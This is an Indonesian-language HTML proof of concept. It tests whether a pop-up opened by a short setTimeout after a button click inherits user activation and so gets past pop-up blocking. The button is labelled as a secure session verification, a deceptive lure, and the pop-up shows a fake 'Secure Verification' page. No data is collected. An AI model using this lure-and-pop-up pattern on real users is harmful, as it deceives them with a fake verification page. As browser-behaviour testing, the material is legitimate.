<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>User Gesture State Inheritance PoC</title>
<style>
  body {
    background: #090d16;
    color: #f8fafc;
    font-family: system-ui, -apple-system, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    margin: 0;
  }
  .card {
    background: #111827;
    padding: 32px;
    border-radius: 16px;
    border: 1px solid #1f2937;
    max-width: 440px;
    text-align: center;
    box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
  }
  button {
    background: #3b82f6;
    color: white;
    border: none;
    padding: 16px 20px;
    border-radius: 10px;
    font-weight: 600;
    cursor: pointer;
    width: 100%;
    font-size: 16px;
    box-shadow: 0 4px 14px rgba(59, 130, 246, 0.4);
    transition: all 0.2s ease;
  }
  button:hover {
    background: #2563eb;
  }
  p {
    color: #9ca3af;
    font-size: 14px;
    line-height: 1.6;
    margin-bottom: 24px;
  }
  h2 {
    margin-bottom: 12px;
    font-size: 20px;
    color: #f3f4f6;
  }
</style>
</head>
<body>

<div class="card">
  <h2>Inisialisasi Sesi Aman</h2>
  <p>Ketuk tombol di bawah untuk memproses autentikasi latar belakang dan membuka modul verifikasi.</p>
  <button id="bypass-btn">Verifikasi Sesi</button>
</div>

<script>
'use strict';

document.getElementById('bypass-btn').addEventListener('click', () => {
  // 1. Menyimpan token/status aktivasi gestur awal dari interaksi klik pengguna
  // 2. Memanfaatkan queue microtask / setTimeout singkat untuk mewarisi state gestur
  
  setTimeout(() => {
    try {
      // Membuka jendela baru / pop-up yang biasanya diblokir oleh browser,
      // namun berhasil lolos karena memanfaatkan warisan status user activation dari klik tombol.
      var targetWindow = window.open('about:blank', '_blank');
      
      if (targetWindow) {
        targetWindow.document.write('<!DOCTYPE html><html><head><title>Secure Verification</title></head><body style="background:#111827;color:#fff;font-family:sans-serif;text-align:center;padding-top:50px;"><h2>Modul Verifikasi Aktif</h2><p>Sesi berhasil diinisialisasi secara aman.</p></body></html>');
      } else {
        console.log('[!] Pop-up diblokir oleh browser.');
      }
    } catch (err) {
      console.error('[!] Gagal mewarisi gestur:', err);
    }
  }, 150); // Jeda waktu singkat untuk menguji ambang batas pewarisan user activation
});
</script>

</body>
</html>
